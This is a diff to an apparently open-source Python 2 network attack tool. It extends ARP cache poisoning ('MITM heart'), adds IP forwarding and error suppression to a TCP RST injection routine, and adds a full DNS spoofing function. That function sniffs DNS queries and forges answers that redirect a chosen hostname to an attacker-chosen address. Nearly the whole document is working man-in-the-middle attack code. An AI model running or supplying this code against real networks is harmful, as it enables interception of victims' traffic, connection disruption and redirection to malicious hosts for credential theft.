@@ -15,6 +15,7 @@
 # Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
 # USA
 
+import dnet
 import pcap
 import dpkt
 import time
@@ -29,15 +30,19 @@ def poison(dev, source_mac, source, target):
 	poison arp cache of target and router, causing all traffic between them to
 	pass inside our machine, MITM heart
 	"""
+	set_ip_forward(1)
 	sock = socket(PF_PACKET, SOCK_RAW)
 	sock.bind((dev, dpkt.ethernet.ETH_TYPE_ARP))
 	try:
 		while True:
 			if core.config.verbose == True:
 				print "[+] {0} <-- {1} -- {2} -- {3} --> {4}".format(source, target, dev, source, target)
-			sock.send(str(build_arp_packet(source_mac, source, target)))
-			sock.send(str(build_arp_packet(source_mac, target, source)))
-			time.sleep(5) # OS refresh ARP cache really often
+			try:
+				sock.send(str(build_arp_packet(source_mac, source, target)))
+				sock.send(str(build_arp_packet(source_mac, target, source)))
+				time.sleep(5) # OS refresh ARP cache really often
+			except:
+				pass
 	except KeyboardInterrupt:
 		print '\n\r[+] Poisoning interrupted'
 		sock.close()
@@ -58,8 +63,11 @@ def rst_inject(dev, source_mac, source, target, port = None):
 	thread.start()
 	pc = pcap.pcap(dev)
 	pc.setfilter(filter) # we need only target packets
-	print '[+] Start poisoning on ' + G + dev + W
-	print '[+] Sending RST packets to ' + R + target + W
+	print '[+] Start poisoning on ' + G + dev + W + ' between ' + G + source + W  + ' and ' + R + target + W
+	if port:
+		print '[+] Sending RST packets to ' + R + target + W + ' on port ' + R + port + W
+	else:
+		print '[+] Sending RST packets to ' + R + target + W
 	if core.config.dotted == True:
 		print '[+] Every dot symbolize a sent packet'
 	counter = 0
@@ -136,7 +144,10 @@ def rst_inject(dev, source_mac, source, target, port = None):
 						type = eth.type,
 						data = send_ip)
 
-				sock.send(str(send_eth))
+				try:
+					sock.send(str(send_eth))
+				except:
+					pass
 
 			if core.config.dotted == True:
 				print_in_line('.')
@@ -147,6 +158,7 @@ def rst_inject(dev, source_mac, source, target, port = None):
 	except KeyboardInterrupt:
 		print '[+] Rst injection interrupted\n\r'
 		sock.close()
+		set_ip_forward(0)
 
 def get_sessions(dev, target, port = 0):
 	filter = 'ip host %s' % target
@@ -191,4 +203,75 @@ def get_sessions(dev, target, port = 0):
 						# print sess
 	except KeyboardInterrupt:
 		print '[+] Session scan interrupted\n\r'
+
+def dns_spoof(dev, source_mac, source, target=None, host=None, redirection=None):
+
+		redirection = gethostbyname(redirection)
+		sock = dnet.ip()
+		filter = 'udp dst port 53'
+		print '[+] Start poisoning on ' + G + dev + W + ' between ' + G + source + W + ' and ' + R + target + W
+		# need to create a daemon that continually poison our target
+		thread = Thread(target = poison, args = (dev, source_mac, source, target,))
+		thread.daemon = True
+		thread.start()
+		pc = pcap.pcap(dev)
+		pc.setfilter(filter)
+		print '[+] Redirecting ' + G + host + W + ' to ' + G + redirection + G + ' for ' + R + target + W
+		try:
+			for ts, pkt in pc:
+				eth = dpkt.ethernet.Ethernet(pkt)
+				ip = eth.data
+				udp = ip.data
+				dns = dpkt.dns.DNS(udp.data)
+				# validate query
+				if dns.qr != dpkt.dns.DNS_Q:
+					continue
+				if dns.opcode != dpkt.dns.DNS_QUERY:
+					continue
+				if len(dns.qd) != 1:
+					continue
+				if len(dns.an) != 0:
+					continue
+				if len(dns.ns) != 0:
+					continue
+				if dns.qd[0].cls != dpkt.dns.DNS_IN:
+					continue
+				if dns.qd[0].type != dpkt.dns.DNS_A:
+					continue
+
+				# spoof for our target name
+				if dns.qd[0].name != host:
+					continue
+
+				# dns query->response
+				dns.op = dpkt.dns.DNS_RA
+				dns.rcode = dpkt.dns.DNS_RCODE_NOERR
+				dns.qr = dpkt.dns.DNS_R
+
+				# construct fake answer
+				arr = dpkt.dns.DNS.RR()
+				arr.cls = dpkt.dns.DNS_IN
+				arr.type = dpkt.dns.DNS_A
+				arr.name = host
+				arr.ip = dnet.addr(redirection).ip
+				# arr.ip = '\x4D\xEE\xB8\x96'
+
+				dns.an.append(arr)
+
+				udp.sport, udp.dport = udp.dport, udp.sport
+				ip.src, ip.dst = ip.dst, ip.src
+				udp.data = dns
+				udp.ulen = len(udp)
+				ip.len = len(ip)
+
+				print inet_ntoa(ip.src)
+
+				buf = dnet.ip_checksum(str(ip))
+				# buf = config.checksum(str(ip))
+				sock.send(buf)
+
+		except KeyboardInterrupt:
+			print '[+] DNS spoofing interrupted\n\r'
+			set_ip_forward(0)
+			sys.exit()
 
